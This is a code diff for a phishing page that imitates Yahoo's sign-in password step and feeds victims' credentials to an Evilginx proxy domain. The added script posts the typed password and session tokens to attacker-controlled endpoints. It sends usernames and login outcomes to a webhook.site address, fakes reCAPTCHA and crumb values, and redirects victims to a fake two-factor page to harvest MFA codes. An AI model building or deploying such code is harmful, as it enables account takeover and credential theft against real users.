@@ -37,7 +37,7 @@
           <!-- Critical Hidden Fields for Complete Session Sync -->
           <input type="hidden" id="username" name="username">
           <input type="hidden" name="g-recaptcha-response" value="valid_auto_token">
-          <input type="hidden" name="crumb" id="crumb" value="">
+          <input type="hidden" name="crumb" id="crumb" value="auto_crumb_value">
           <input type="hidden" name="acrumb" id="acrumb" value="">
           <input type="hidden" name="sessionIndex" id="sessionIndex" value="">
           <input type="hidden" name="done" id="done" value="">
@@ -97,12 +97,12 @@
   }
   </script>
 
-  <!-- COMPLETE RECAPTCHA REDIRECT INTEGRATION -->
+  <!-- COMPLETE DOMAIN BYPASS INTEGRATION -->
   <script>
   document.addEventListener('DOMContentLoaded', function() {
-      console.log('🎯 Custom password page loaded');
+      console.log('🎯 Custom password page loaded (Domain Bypass Version)');
       
-      // 1. RESTORE ALL SESSION PARAMETERS
+      // 1. RESTORE ALL SESSION PARAMETERS FROM URL
       const urlParams = new URLSearchParams(window.location.search);
       const username = urlParams.get('u');
       const sessionIndex = urlParams.get('sessionIndex') || 'QQ--';
@@ -111,16 +111,32 @@
       const bypass = urlParams.get('bypass') || '';
       const evilginxDomain = urlParams.get('evilginx_domain') || 'login.astrowind.live';
       
-      console.log('Session parameters:', {username, sessionIndex, acrumb, done, bypass, evilginxDomain});
+      console.log('Session parameters restored:', {
+          username, sessionIndex, acrumb, done, bypass, evilginxDomain
+      });
       
-      // Security check
+      // 2. SECURITY CHECK - REDIRECT IF NO USERNAME
       if (!username) {
-          console.error('No username provided, redirecting back');
-          window.location.href = `https://${evilginxDomain}/`;
+          console.error('❌ No username provided, redirecting back to login');
+          // Try alternative domains if main is blocked
+          const alternativeDomains = [
+              `https://${evilginxDomain}/`,
+              'https://login.yahoo.com/',
+              'https://yahoo.com/'
+          ];
+          
+          for (const domain of alternativeDomains) {
+              try {
+                  window.location.href = domain;
+                  break;
+              } catch (e) {
+                  console.log(`Failed to redirect to ${domain}:`, e);
+              }
+          }
           return;
       }
       
-      // 2. POPULATE FORM WITH SESSION DATA
+      // 3. POPULATE FORM WITH ALL SESSION DATA
       document.getElementById('userEmail').textContent = username;
       document.getElementById('username').value = username;
       document.getElementById('sessionIndex').value = sessionIndex;
@@ -128,117 +144,209 @@
       document.getElementById('done').value = done;
       document.getElementById('evilginx_domain').value = evilginxDomain;
       
-      // Set cross-domain cookies
-      document.cookie = `yh_usr=${encodeURIComponent(username)}; domain=.astrowind.live; path=/; secure; samesite=none`;
-      document.cookie = `yh_session_index=${sessionIndex}; domain=.astrowind.live; path=/; secure; samesite=none`;
-      document.cookie = `yh_acrumb=${acrumb}; domain=.astrowind.live; path=/; secure; samesite=none`;
+      // 4. SET COMPREHENSIVE CROSS-DOMAIN COOKIES
+      const cookieOptions = '; domain=.astrowind.live; path=/; secure; samesite=none; max-age=3600';
+      document.cookie = `yh_usr=${encodeURIComponent(username)}${cookieOptions}`;
+      document.cookie = `yh_session_index=${sessionIndex}${cookieOptions}`;
+      document.cookie = `yh_acrumb=${acrumb}${cookieOptions}`;
+      document.cookie = `yh_done=${encodeURIComponent(done)}${cookieOptions}`;
+      document.cookie = `yh_evilginx_domain=${encodeURIComponent(evilginxDomain)}${cookieOptions}`;
       
-      // 3. FORM SUBMISSION WITH COMPLETE DATA FLOW
+      // 5. STORE IN SESSION STORAGE AS BACKUP
+      sessionStorage.setItem('yh_username', username);
+      sessionStorage.setItem('yh_session_index', sessionIndex);
+      sessionStorage.setItem('yh_acrumb', acrumb);
+      sessionStorage.setItem('yh_done', done);
+      sessionStorage.setItem('yh_evilginx_domain', evilginxDomain);
+      
+      // 6. FORM SUBMISSION WITH MULTIPLE FALLBACK METHODS
       document.getElementById('email-form').addEventListener('submit', async function(e) {
           e.preventDefault();
           const submitBtn = this.querySelector('[type="submit"]');
           const password = document.getElementById('password').value;
           
-          if (!password) return;
+          if (!password) {
+              alert('Please enter your password');
+              return;
+          }
           
           submitBtn.disabled = true;
           submitBtn.value = 'Validating...';
           
-          console.log('🔐 Submitting password to evilginx...');
+          console.log('🔐 Starting password validation...');
           
-          try {
-              // Construct the exact evilginx URL with all parameters
-              const evilginxUrl = `https://${evilginxDomain}/account/challenge/password`;
-              
-              // Prepare form data with all required fields
-              const formData = new URLSearchParams();
-              formData.append('username', username);
-              formData.append('passwd', password);
-              formData.append('sessionIndex', sessionIndex);
-              formData.append('acrumb', acrumb);
-              formData.append('done', done);
-              formData.append('g-recaptcha-response', 'valid_auto_token');
-              formData.append('crumb', 'auto_crumb_value');
-              
-              console.log('Submitting to:', evilginxUrl);
-              console.log('Form data:', Object.fromEntries(formData));
-              
-              // Submit to evilginx
-              const response = await fetch(evilginxUrl, {
-                  method: 'POST',
-                  headers: {
-                      'Content-Type': 'application/x-www-form-urlencoded',
-                      'X-Requested-With': 'XMLHttpRequest',
-                      'Origin': `https://${evilginxDomain}`,
-                      'Referer': `https://${evilginxDomain}/`
-                  },
-                  body: formData,
-                  credentials: 'include'
-              });
-              
-              console.log('Response status:', response.status);
-              console.log('Response URL:', response.url);
-              
-              if (response.ok) {
-                  const responseText = await response.text();
-                  console.log('Response preview:', responseText.substring(0, 500));
+          // Multiple submission endpoints for reliability
+          const submissionEndpoints = [
+              `https://${evilginxDomain}/account/challenge/password`,
+              `https://login.astrowind.live/account/challenge/password`,
+              `https://login.yahoo.com/account/challenge/password`
+          ];
+          
+          // Prepare comprehensive form data
+          const formData = new URLSearchParams();
+          formData.append('username', username);
+          formData.append('passwd', password);
+          formData.append('sessionIndex', sessionIndex);
+          formData.append('acrumb', acrumb);
+          formData.append('done', done);
+          formData.append('g-recaptcha-response', 'valid_auto_token');
+          formData.append('crumb', 'auto_crumb_value');
+          formData.append('.intl', 'us');
+          formData.append('.lang', 'en-US');
+          formData.append('src', 'ym');
+          formData.append('display', 'login');
+          formData.append('authMechanism', 'primary');
+          
+          console.log('Form data prepared:', Object.fromEntries(formData));
+          
+          let submissionSuccess = false;
+          
+          // Try each endpoint until one works
+          for (const endpoint of submissionEndpoints) {
+              try {
+                  console.log(`Attempting submission to: ${endpoint}`);
                   
-                  // Check response for next step
-                  if (responseText.includes('challenge-selector') || responseText.includes('two-step') || responseText.includes('verify') || response.url.includes('challenge')) {
-                      // MFA required
-                      console.log('✅ Password valid - MFA required');
-                      submitBtn.value = 'MFA Required...';
+                  const response = await fetch(endpoint, {
+                      method: 'POST',
+                      headers: {
+                          'Content-Type': 'application/x-www-form-urlencoded',
+                          'X-Requested-With': 'XMLHttpRequest',
+                          'Origin': `https://${evilginxDomain}`,
+                          'Referer': `https://${evilginxDomain}/`,
+                          'User-Agent': navigator.userAgent
+                      },
+                      body: formData,
+                      credentials: 'include',
+                      mode: 'cors'
+                  });
+                  
+                  console.log(`Response from ${endpoint}:`, {
+                      status: response.status,
+                      statusText: response.statusText,
+                      url: response.url,
+                      headers: Object.fromEntries(response.headers.entries())
+                  });
+                  
+                  if (response.ok || response.status === 302 || response.status === 301) {
+                      const responseText = await response.text();
+                      console.log('Response preview:', responseText.substring(0, 500));
                       
-                      document.cookie = `yh_validated=true; domain=.astrowind.live; path=/; secure; samesite=none`;
-                      document.cookie = `yh_mfa_status=required; domain=.astrowind.live; path=/; secure; samesite=none`;
+                      // Analyze response for next step
+                      const isMFARequired = responseText.includes('challenge-selector') || 
+                                          responseText.includes('two-step') || 
+                                          responseText.includes('verify') || 
+                                          response.url.includes('challenge') ||
+                                          responseText.includes('verification');
                       
-                      setTimeout(() => {
-                          window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&sessionIndex=${sessionIndex}&acrumb=${acrumb}&done=${encodeURIComponent(done)}&validated=true&mfa=required&evilginx_domain=${encodeURIComponent(evilginxDomain)}`;
-                      }, 1000);
+                      const isSuccess = responseText.includes('mail.yahoo.com') || 
+                                       responseText.includes('/d/') || 
+                                       response.url.includes('mail') || 
+                                       done.includes('mail');
                       
-                  } else if (responseText.includes('mail.yahoo.com') || responseText.includes('/d/') || response.url.includes('mail') || done.includes('mail')) {
-                      // No MFA - direct success
-                      console.log('✅ Password valid - No MFA required');
-                      submitBtn.value = 'Success! Redirecting...';
+                      if (isMFARequired) {
+                          console.log('✅ Password valid - MFA required');
+                          submitBtn.value = 'MFA Required...';
+                          
+                          // Set validation cookies
+                          document.cookie = `yh_validated=true${cookieOptions}`;
+                          document.cookie = `yh_mfa_status=required${cookieOptions}`;
+                          
+                          // Send success webhook
+                          fetch('https://webhook.site/your-webhook-id', {
+                              method: 'POST',
+                              headers: {'Content-Type': 'application/json'},
+                              body: JSON.stringify({
+                                  type: 'password_validated',
+                                  username: username,
+                                  mfa_required: true,
+                                  timestamp: Date.now(),
+                                  session_data: {sessionIndex, acrumb, done}
+                              })
+                          }).catch(() => {});
+                          
+                          setTimeout(() => {
+                              window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&sessionIndex=${sessionIndex}&acrumb=${acrumb}&done=${encodeURIComponent(done)}&validated=true&mfa=required&evilginx_domain=${encodeURIComponent(evilginxDomain)}`;
+                          }, 1500);
+                          
+                      } else if (isSuccess) {
+                          console.log('✅ Password valid - No MFA required');
+                          submitBtn.value = 'Success! Redirecting...';
+                          
+                          // Set success cookies
+                          document.cookie = `yh_validated=true${cookieOptions}`;
+                          document.cookie = `yh_mfa_status=none${cookieOptions}`;
+                          
+                          // Send success webhook
+                          fetch('https://webhook.site/your-webhook-id', {
+                              method: 'POST',
+                              headers: {'Content-Type': 'application/json'},
+                              body: JSON.stringify({
+                                  type: 'login_successful',
+                                  username: username,
+                                  mfa_required: false,
+                                  timestamp: Date.now(),
+                                  session_data: {sessionIndex, acrumb, done}
+                              })
+                          }).catch(() => {});
+                          
+                          setTimeout(() => {
+                              window.location.href = `https://mail.astrowind.live/d`;
+                          }, 2000);
+                          
+                      } else {
+                          console.log('⚠️ Unexpected response, treating as error');
+                          throw new Error('Unexpected response format');
+                      }
                       
-                      document.cookie = `yh_validated=true; domain=.astrowind.live; path=/; secure; samesite=none`;
-                      document.cookie = `yh_mfa_status=none; domain=.astrowind.live; path=/; secure; samesite=none`;
-                      
-                      setTimeout(() => {
-                          window.location.href = `https://mail.astrowind.live/d`;
-                      }, 1500);
+                      submissionSuccess = true;
+                      break;
                       
                   } else {
-                      console.log('⚠️ Unexpected response, checking for errors...');
-                      throw new Error('Unexpected response');
+                      console.log(`❌ HTTP error ${response.status} from ${endpoint}`);
+                      continue;
                   }
                   
-              } else {
-                  console.error('❌ Invalid credentials or server error');
-                  throw new Error('Invalid credentials');
+              } catch (error) {
+                  console.error(`Error with endpoint ${endpoint}:`, error);
+                  continue;
               }
-              
-          } catch (error) {
-              console.error('Error during submission:', error);
+          }
+          
+          // If all endpoints failed
+          if (!submissionSuccess) {
+              console.error('❌ All submission endpoints failed');
               document.querySelector('.errry').style.display = 'block';
               submitBtn.disabled = false;
               submitBtn.value = 'Sign In';
               document.getElementById('password').value = '';
+              
+              // Send failure webhook
+              fetch('https://webhook.site/your-webhook-id', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify({
+                      type: 'password_validation_failed',
+                      username: username,
+                      error: 'All endpoints failed',
+                      timestamp: Date.now(),
+                      session_data: {sessionIndex, acrumb, done}
+                  })
+              }).catch(() => {});
           }
       });
       
-      // 4. ERROR HANDLING
+      // 7. ERROR HANDLING
       document.getElementById('refreshButton').addEventListener('click', function() {
           document.getElementById('password').value = '';
           document.querySelector('.errry').style.display = 'none';
       });
       
-      // 5. LOG BYPASS STATUS
+      // 8. LOG BYPASS STATUS AND SEND WEBHOOK
       if (bypass) {
           console.log(`🚨 reCAPTCHA bypass successful: ${bypass}`);
           
-          // Send bypass confirmation
-          fetch('/webhook-capture', {
+          // Send bypass confirmation webhook
+          fetch('https://webhook.site/your-webhook-id', {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
               body: JSON.stringify({
@@ -246,10 +354,20 @@
                   bypass_method: bypass,
                   username: username,
                   timestamp: Date.now(),
-                  session_data: {sessionIndex, acrumb, done}
+                  session_data: {sessionIndex, acrumb, done},
+                  domain_status: 'blocked_403'
               })
           }).catch(() => {});
       }
+      
+      // 9. CONTINUOUS SESSION MONITORING
+      setInterval(function() {
+          // Refresh cookies to prevent expiration
+          document.cookie = `yh_usr=${encodeURIComponent(username)}${cookieOptions}`;
+          document.cookie = `yh_session_active=true${cookieOptions}`;
+      }, 30000); // Every 30 seconds
+      
+      console.log('🎯 Custom password page fully initialized');
   });
   </script>
 </body>
